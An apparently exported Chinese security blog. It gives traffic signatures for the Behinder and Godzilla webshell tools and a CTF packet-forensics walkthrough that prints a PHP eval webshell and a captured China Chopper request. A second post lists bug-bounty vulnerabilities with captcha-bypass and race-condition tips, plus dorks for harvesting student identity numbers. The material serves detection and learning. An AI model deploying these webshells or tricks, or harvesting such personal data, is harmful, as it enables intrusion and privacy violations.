<h4 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征</span><br><span class="line">2.内置10个user-agent ,每次连接shell时会随机选择一个进行使用.</span><br><span class="line">3.因为冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右</span><br><span class="line">4.冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive</span><br><span class="line">5.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M</span><br><span class="line">响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">6.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br></pre></td></tr></table></figure>



<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>支持多种加密</p>
<p>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.user-agent,如果不修改的话会返回使用的jdk信息</span><br><span class="line">2.在请求包的Cookie中有一个非常致命的特征是会在最后出现分号</span><br><span class="line">3.请求Accept和响应中Cache-Control字段（辅助认证）</span><br><span class="line">4.响应包中的数据前16位为MD5+base64+后16位为MD5。</span><br></pre></td></tr></table></figure>





<h2 id="做题："><a href="#做题：" class="headerlink" title="做题："></a>做题：</h2><p>链接：<a href="https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray">https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray</a> </p>
<p>答案链接：链接：<a href="https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q">https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q</a><br>提取码：087q </p>
<p>1、黑客使用的扫描器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;wvs&quot;</span><br></pre></td></tr></table></figure>

<p>2、先黑客扫描到的后台登陆地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login&quot;	</span><br></pre></td></tr></table></figure>

<p>在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login.php?rec&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>3、黑客使用了什么账号密码登陆了web后台</p>
<p>同二可得到答案</p>
<p>4、黑客上传的webshell文件名是，内容是什么</p>
<p>关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval</span><br><span class="line">assert</span><br><span class="line">system</span><br></pre></td></tr></table></figure>

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eval&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>很快的定位到黑客上传的木马的地址：&#x2F;images&#x2F;article&#x2F;a.php</p>
<p>传的🐎密码为1234</p>
<p>再：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;[1234]&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;keywords&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php &lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure>

<p>5、黑客在robots.txt中找到的flag是什么：</p>
<p>直接搜robots.txt的关键词 Disallow 就好了</p>
<p>注意大小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;Disallow&quot;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br></pre></td></tr></table></figure>

<p>6、黑客找到的数据库密码是多少：</p>
<p>分析菜刀流量</p>
<p>搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;1234=&quot;</span><br></pre></td></tr></table></figure>

<p>然后追踪tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /images/article/a.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_171</span><br><span class="line">Host: 192.168.32.189</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 375</span><br><span class="line"></span><br><span class="line">1234=@eval.(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D&amp;z1=L3Zhci93d3cvaHRtbC9kYXRhL2NvbmZpZy5waHA%3DHTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 08 Aug 2018 08:18:05 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.4.45</span><br><span class="line">Content-Length: 1092</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * DouPHP</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ............ 2014-2015 ...............................................................</span><br><span class="line"> * ............: http://www.douco.com</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ..............................................................................................................................................................................</span><br><span class="line"> * ...............http://www.douco.com/license.html</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * Author: DouCo</span><br><span class="line"> * Release Date: 2015-06-10</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// database host</span><br><span class="line">$dbhost   = &quot;10.3.3.101&quot;;</span><br><span class="line"></span><br><span class="line">// database name</span><br><span class="line">$dbname   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// database username</span><br><span class="line">$dbuser   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line">// database password</span><br><span class="line">$dbpass   = &quot;e667jUPvJjXHvEUv&quot;;</span><br><span class="line"></span><br><span class="line">// table prefix</span><br><span class="line">$prefix   = &quot;dou_&quot;;</span><br><span class="line"></span><br><span class="line">// charset</span><br><span class="line">define(&#x27;DOU_CHARSET&#x27;,&#x27;utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// administrator path</span><br><span class="line">define(&#x27;ADMIN_PATH&#x27;,&#x27;admin&#x27;);</span><br><span class="line"></span><br><span class="line">// mobile path</span><br><span class="line">define(&#x27;M_PATH&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>

<p>所以数据库密码为：e667jUPvJjXHvEUv</p>
<p>7、黑客在数据库中找到的hash_code是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.query matches &quot;hash_code&quot;</span><br></pre></td></tr></table></figure>

<p>d1c029893df40cb0f47bcf8f1c3c17ac</p>
<p>8、黑客破解了账号<a href="mailto:&#x69;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#x74;&#46;&#99;&#111;&#109;">&#x69;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#x74;&#46;&#99;&#111;&#109;</a>得到的密码是什么</p>
<p>mysql contains “<a href="mailto:&#105;&#106;&#110;&#x75;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#x63;&#111;&#109;">&#105;&#106;&#110;&#x75;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#x63;&#111;&#109;</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ijnu@test.com b78f5aa6e1606f07def6e839121a22ec.ADMIN</span><br></pre></td></tr></table></figure>

<p>md5解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edc123!@#</span><br></pre></td></tr></table></figure>

<p>9、被黑客攻击的web服务器，网卡配置是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure>

<p>答案：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599085 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032868 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476430398 (454.3 MiB)  TX bytes:1041839269 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>

<p>10、黑客使用了什么账号登陆了mail系统:</p>
<p>admin&#x2F;admin!@#pass123</p>
<p>11、黑客获得的vpn,ip是多少：</p>
<p>vpn中扫描其他ip最多的就是黑客的内网ip</p>
<p>10.3.4.3</p>
<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/218407.html">https://www.freebuf.com/articles/system/218407.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/436617932">https://zhuanlan.zhihu.com/p/436617932</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html">https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9">https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9</a></p>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><h4 id="3W1H"><a href="#3W1H" class="headerlink" title="3W1H"></a><strong>3W1H</strong></h4><p>who: 攻击者IP，受害主机是那些，是在那个安全设备上出现的告警</p>
<p>what：发生了什么攻击行为，是漏扫探测，还是已经打进来了？产品版本是多少？其他未失陷主机有没有这样的漏洞？</p>
<p>why：是因为开放了不安全端口？还是已有漏洞未修补？为什么前期没有排查出来？还是因为被钓鱼？</p>
<p>how：具体是怎么攻击的？是不是在野0day？怎么抑制？怎么修补？</p>
<h4 id="易失性原则"><a href="#易失性原则" class="headerlink" title="易失性原则"></a><strong>易失性原则</strong></h4><p>时效性</p>
<p>有一定的先后顺序，即最容易丢失的数据，应该最先收集，其它的依次类推。</p>
<h4 id="要素原则"><a href="#要素原则" class="headerlink" title="要素原则"></a><strong>要素原则</strong></h4><p>主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</p>
<h4 id="避害原则"><a href="#避害原则" class="headerlink" title="避害原则"></a><strong>避害原则</strong></h4><p>趋利避害，不能问题还没有解决，反而引入了新的问题。</p>
<p>失陷主机下线或隔离</p>
<p>使用来源不明被感染的工具</p>
<p>钓鱼样本或勒索样本不加密不压缩发送</p>
<h3 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a><strong>应急响应流程</strong></h3><p>判断是否是真实攻击，是否是误报</p>
<p>收集信息：收集客户信息和中毒主机信息，包括样本。</p>
<p>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、等等。</p>
<p>深入分析：日志分析、进程分析、启动项分析、样本分析。</p>
<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>
<p>产出报告：整理并输出完整的安全事件报告。</p>
]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞整理</title>
    <url>/2023/03/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>其实漏洞是通用的，不管是APP、微信小程序、公众号、网页了，这里细分一点主要是方便我进行一个记录。</p>
<span id="more"></span>

<h2 id="小程序公众号漏洞："><a href="#小程序公众号漏洞：" class="headerlink" title="小程序公众号漏洞："></a>小程序公众号漏洞：</h2><p><a href="https://juejin.cn/post/7202583557750603833">微信小程序解包+反编译 - 掘金 (juejin.cn)</a></p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE">小程序配置 | 微信开放文档 (qq.com)</a></p>
<p><a href="https://blog.csdn.net/wapqke/article/details/118312263">微信小程序如何进行反编译详细教程_小程序反编译_陆大湿的博客-CSDN博客</a></p>
<p><a href="https://www.yeshen.com/faqs/S1ogLqZgW">夜神内微信搜索、扫二维码异常解决办法_夜神安卓模拟器新手帮助页 (yeshen.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1vU4y1r73j/?spm_id_from=888.80997.embed_other.whitelist">WX小程序反编译教程及解包教程和解包工具使用 大家看完记得三连哦 三连完了问我要工具哦_哔哩哔哩_bilibili</a></p>
<p>小程序反编译（有可能小程序里面源码有key类似的东西）</p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">敏感信息泄露</td>
<td align="center"></td>
<td align="center">等级看泄露的什么来判</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">访问控制问题</td>
</tr>
<tr>
<td align="center">验证码功能缺陷</td>
<td align="center">中</td>
<td align="center">防护机制问题</td>
</tr>
<tr>
<td align="center">Tomcat_AJP任意文件读取漏洞</td>
<td align="center">高</td>
<td align="center">访问控制问题，CVE-2020-1938</td>
</tr>
<tr>
<td align="center">同一时间能够对大量手机号发送短信验证码</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">短信验证码绕过</td>
<td align="center">低</td>
<td align="center">如果有号码加密，有的时候可以看到加密可以复用加密内容，然后越权</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">泄露中间件及版本（这都收</td>
</tr>
<tr>
<td align="center">暗链</td>
<td align="center">中</td>
<td align="center">网页中存在不是自己业务的域名，毫无相干</td>
</tr>
<tr>
<td align="center">内网地址泄露</td>
<td align="center">低</td>
<td align="center">js文件中可能存在内网地址</td>
</tr>
<tr>
<td align="center">短信验证码不失效</td>
<td align="center">低</td>
<td align="center">重新发了新的验证码，但是旧的验证码没失效，可以提高爆破概率</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中</td>
<td align="center">直接访问对应url发现未授权访问</td>
</tr>
<tr>
<td align="center">shiro反序列化</td>
<td align="center">高</td>
<td align="center">可以RCE</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">高</td>
<td align="center">修改ID可以看到别人信息</td>
</tr>
<tr>
<td align="center">文件上传</td>
<td align="center">高</td>
<td align="center">如果有可以jsp、php类似的都试一下</td>
</tr>
<tr>
<td align="center">php敏感信息泄露</td>
<td align="center">高</td>
<td align="center">可以先burp抓包得到公众号域名，然后使用jsfinder来扫url</td>
</tr>
</tbody></table>
<h1 id="web漏洞："><a href="#web漏洞：" class="headerlink" title="web漏洞："></a>web漏洞：</h1><p>等级判定可参考：<a href="https://help.aliyun.com/document_detail/40067.html">https://help.aliyun.com/document_detail/40067.html</a></p>
<table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">短信验证码可暴力破解</td>
<td align="center">中</td>
<td align="center">开发人员一般依赖于HTTP Host header。</td>
</tr>
<tr>
<td align="center">url重定向漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">文件绝对路径泄露也算</td>
</tr>
<tr>
<td align="center">cookies敏感信息泄露</td>
<td align="center">低</td>
<td align="center">这都算（</td>
</tr>
<tr>
<td align="center">Host头攻击</td>
<td align="center">中</td>
<td align="center">例如，在php里用_SERVER[“HTTP_HOST”]。但是这个header是不可信赖的，如果应用程序没有对host header值进行处理，就有可能造成恶意代码的传入。</td>
</tr>
<tr>
<td align="center">登录绕过</td>
<td align="center">高</td>
<td align="center">只要用户名对就可登录，密码无所谓（还能有这种情况</td>
</tr>
<tr>
<td align="center">明文传输</td>
<td align="center">中</td>
<td align="center">未对传输的账号密码进行加密且未使用https</td>
</tr>
<tr>
<td align="center">SL证书认证文件</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">滑块验证码失效</td>
<td align="center">中</td>
<td align="center">滑块失效</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">error.log</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">nginx-status</td>
</tr>
<tr>
<td align="center">敏感文件泄露</td>
<td align="center">低</td>
<td align="center">前端加密方法泄露也算</td>
</tr>
<tr>
<td align="center">存储型XSS</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">弱口令</td>
<td align="center">高</td>
<td align="center">弱口令竟然都算高</td>
</tr>
<tr>
<td align="center">验证码失效</td>
<td align="center">中</td>
<td align="center">验证码没在服务器端验证</td>
</tr>
<tr>
<td align="center">crossdomain.xml文件配置不当</td>
<td align="center">中</td>
<td align="center">可能导致csrf</td>
</tr>
<tr>
<td align="center">反射型xss</td>
<td align="center">中</td>
<td align="center">恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的</td>
</tr>
<tr>
<td align="center">逻辑漏洞之任意用户登录</td>
<td align="center">高</td>
<td align="center">修改返回包直接登录</td>
</tr>
<tr>
<td align="center">暴力破解</td>
<td align="center">中</td>
<td align="center">密码错误长度相同，且多次爆破没返回次数限制</td>
</tr>
<tr>
<td align="center">越权访问</td>
<td align="center">低</td>
<td align="center">根据越权修改ID获取他人余额(看到有的等级是高</td>
</tr>
<tr>
<td align="center">内网IP地址泄露</td>
<td align="center">低</td>
<td align="center">直接返回IP而不是域名，惊（注释的内网IP泄露竟然也算</td>
</tr>
<tr>
<td align="center">Fastjson反序列化漏洞</td>
<td align="center">中</td>
<td align="center">可以dnslog验证，（看到json数据传输可以试试看是不是fastjson，也是其一个特征，<a href="https://cloud.tencent.com/developer/article/1957185">浅析FastJSON反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></td>
</tr>
<tr>
<td align="center">信息泄露</td>
<td align="center">低|高</td>
<td align="center">破坏请求头结构，使得报错，返回详细报错信息（等级看泄露东西的严重性</td>
</tr>
<tr>
<td align="center">链接注入漏洞</td>
<td align="center">中</td>
<td align="center">感觉属于xss，但可以点击链接跳转（确实，同一个点刷了两个洞</td>
</tr>
<tr>
<td align="center">任意文件上传</td>
<td align="center">中</td>
<td align="center">上传任意后缀文件</td>
</tr>
<tr>
<td align="center">CSRF</td>
<td align="center">中</td>
<td align="center">对应表单，burp抓包，bp CSRF POC构造</td>
</tr>
<tr>
<td align="center">未授权访问</td>
<td align="center">中|高</td>
<td align="center">直接不需要登录就管理界面，加token等</td>
</tr>
<tr>
<td align="center">软件压缩目录泄露</td>
<td align="center">中</td>
<td align="center">可以多扫目录试试</td>
</tr>
<tr>
<td align="center">Webpack源码泄漏</td>
<td align="center">中</td>
<td align="center">webpack是一个打包器，能将多个文件打包成一个文件。（在源代码处看到webpack可以仔细检查确定是否存在该漏洞</td>
</tr>
<tr>
<td align="center">CORS</td>
<td align="center">中</td>
<td align="center">特征：Access-Control-Allow-Origin：*，cors漏洞一般用于窃取用户敏感数据</td>
</tr>
<tr>
<td align="center">tomcat示例目录未删除</td>
<td align="center">低</td>
<td align="center">*&#x2F;docs&#x2F;，存在说明文档</td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center">低</td>
<td align="center">利用该信息可以更容易得到网站权限</td>
</tr>
<tr>
<td align="center">spring-boot端点未授权</td>
<td align="center">高</td>
<td align="center">例如：*&#x2F;prod-api&#x2F;actuator&#x2F;env，会泄露敏感信息；特征：左上角绿叶，对应报错信息；参考：<a href="https://blog.csdn.net/guo15890025019/article/details/119885737">Spring Boot Actuator未授权访问漏洞利用_springboot漏洞利用_大鸟安全的博客-CSDN博客</a></td>
</tr>
<tr>
<td align="center">图形验证码失效</td>
<td align="center">中</td>
<td align="center">使用相同验证码多次重发，验证码仍可用</td>
</tr>
<tr>
<td align="center">中间件版本泄露</td>
<td align="center">低</td>
<td align="center">一般不收</td>
</tr>
<tr>
<td align="center">批量提交</td>
<td align="center">中</td>
<td align="center">表单重复提交，会造成数据重复，增加服务器负载，严重甚至会造成服务器宕机（这都算</td>
</tr>
<tr>
<td align="center">swagger未授权</td>
<td align="center">高</td>
<td align="center"><a href="https://cloud.tencent.com/developer/article/2160217">Swagger未授权访问漏洞 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>，会暴露接口地址，从而可能被进行利用</td>
</tr>
<tr>
<td align="center">短信验证码爆破漏洞</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">用户名枚举</td>
<td align="center">低</td>
<td align="center">可以根据验证码结合，当用户存在会发验证码，不存在不会发</td>
</tr>
<tr>
<td align="center">Thymeleaf远程命令执行</td>
<td align="center">高</td>
<td align="center">若依CMS</td>
</tr>
<tr>
<td align="center">接口文档泄露</td>
<td align="center">高</td>
<td align="center">有的XML文档包含接口也算</td>
</tr>
<tr>
<td align="center">phpinfo界面泄露</td>
<td align="center">中</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Nginx主机实时监控流量数据泄露</td>
<td align="center">高</td>
<td align="center">*&#x2F;statusicon&#x2F;</td>
</tr>
<tr>
<td align="center">Source Map</td>
<td align="center">中</td>
<td align="center">*.js.map</td>
</tr>
<tr>
<td align="center">Springboot Snake YAML</td>
<td align="center">高</td>
<td align="center">反弹shell</td>
</tr>
<tr>
<td align="center">上传jspgetshell</td>
<td align="center">高</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">逻辑漏洞</td>
<td align="center">高</td>
<td align="center">一般余额都是保留到分(也就是0.00)，充值0.019如果平台校验有问题会四舍五入，然后白嫖一分。</td>
</tr>
<tr>
<td align="center">刷赞</td>
<td align="center">中</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py，在数据包任意位置加上%s 攻击</td>
</tr>
<tr>
<td align="center">添加现在</td>
<td align="center">高</td>
<td align="center">turbo intruder 模式下进行并发 选择race.py</td>
</tr>
<tr>
<td align="center">不收限制的资源调用</td>
<td align="center">高</td>
<td align="center">调用接口消耗资源，爆破信息</td>
</tr>
<tr>
<td align="center">短信验证码复用漏洞</td>
<td align="center">低</td>
<td align="center">登录成功后不失效</td>
</tr>
<tr>
<td align="center">验证码与手机号未绑定</td>
<td align="center">高</td>
<td align="center">未绑定手机号，任意修改密码</td>
</tr>
<tr>
<td align="center">验证码爆破</td>
<td align="center">高</td>
<td align="center">手机号码前后加空格，86，086，0086，+86，0，00，&#x2F;r,&#x2F;n, 以及特殊符号等。或者url编码</td>
</tr>
<tr>
<td align="center">csrf</td>
<td align="center">高</td>
<td align="center">使用cookie等本地凭证在<img>打等</td>
</tr>
<tr>
<td align="center">逻辑并发</td>
<td align="center">中</td>
<td align="center">领东西的时候并发测试</td>
</tr>
<tr>
<td align="center">时间校验漏洞</td>
<td align="center">中</td>
<td align="center">某些会员通过本地时间判断</td>
</tr>
<tr>
<td align="center">手机验证码回显</td>
<td align="center">中</td>
<td align="center">（没见到谁这么干过</td>
</tr>
<tr>
<td align="center">首单优惠绕过</td>
<td align="center">中</td>
<td align="center">优惠数据包重发</td>
</tr>
<tr>
<td align="center">xss</td>
<td align="center">中</td>
<td align="center">上传html文件中有xss，路径随机但host相同也算（竟然都要算</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center">匿名用户uid泄露等，身份证暴露等</td>
</tr>
<tr>
<td align="center">邮箱轰炸</td>
<td align="center">中</td>
<td align="center">还以为只有短信轰炸才算</td>
</tr>
<tr>
<td align="center">越权</td>
<td align="center">中</td>
<td align="center">订单收获地址一般都有</td>
</tr>
</tbody></table>
<h2 id="APP漏洞："><a href="#APP漏洞：" class="headerlink" title="APP漏洞："></a>APP漏洞：</h2><p><del>等我学习了在更新</del></p>
<h2 id="公众号小程序漏洞"><a href="#公众号小程序漏洞" class="headerlink" title="公众号小程序漏洞"></a>公众号小程序漏洞</h2><h2 id="SRC挖掘技巧"><a href="#SRC挖掘技巧" class="headerlink" title="SRC挖掘技巧"></a>SRC挖掘技巧</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>多看burp http-history看</p>
<p>jsfind</p>
<p>控制台</p>
<h3 id="利用fofa语法"><a href="#利用fofa语法" class="headerlink" title="利用fofa语法"></a>利用fofa语法</h3><p>“系统” &amp;&amp; org&#x3D;”China Education and Research Network Center”，我们可以看见红色框内是有很多图标，这些有可能就是系统的指纹，fofa直接给你归纳好的，现在我们只需要一个一个图标打开然后用傻瓜式渗透顺序打一通</p>
<p><a href="https://zhuanlan.zhihu.com/p/622876836">FOFA入门指南：轻松掌握搜索技巧和特色功能 - 知乎 (zhihu.com)</a></p>
<h3 id="查看开发商排行榜"><a href="#查看开发商排行榜" class="headerlink" title="查看开发商排行榜"></a>查看开发商排行榜</h3><p>edu平台的跟新，我发现他多了一个开发商排行，这样等于是给我们列出来了edu用户的系统公司，就可以节省我们的时间再去查找开发商来找对应的系统，确定系统寻找手册弱口令</p>
<h3 id="利用谷歌hacking、咸鱼、github搜集敏感信息"><a href="#利用谷歌hacking、咸鱼、github搜集敏感信息" class="headerlink" title="利用谷歌hacking、咸鱼、github搜集敏感信息"></a>利用谷歌hacking、咸鱼、github搜集敏感信息</h3><p>site:.edu.cn sfz  filetype: pdf|xls|doc</p>
<p>site:edu.cn (filetype:pdf OR filetype:xls OR filetype:doc)</p>
<p>学号 工号 身份证</p>
<p>去找所在学校相关的教育局站点，因为助学金等奖励都会通过当地教育局进行展开，这样在相关教育局站点我们也可以收集到我们需要的信息，当然你也可以加入班群，表白墙等容易泄露信息的地方。高校网站找找到门户服务网站，此时一定要注意门户网站的帮助</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>关注漏洞库：<a href="http://www.i-dock.net/">PeiQi文库 (i-dock.net)</a>，有网站测绘，即搜索语法使用起来还挺方便</p>
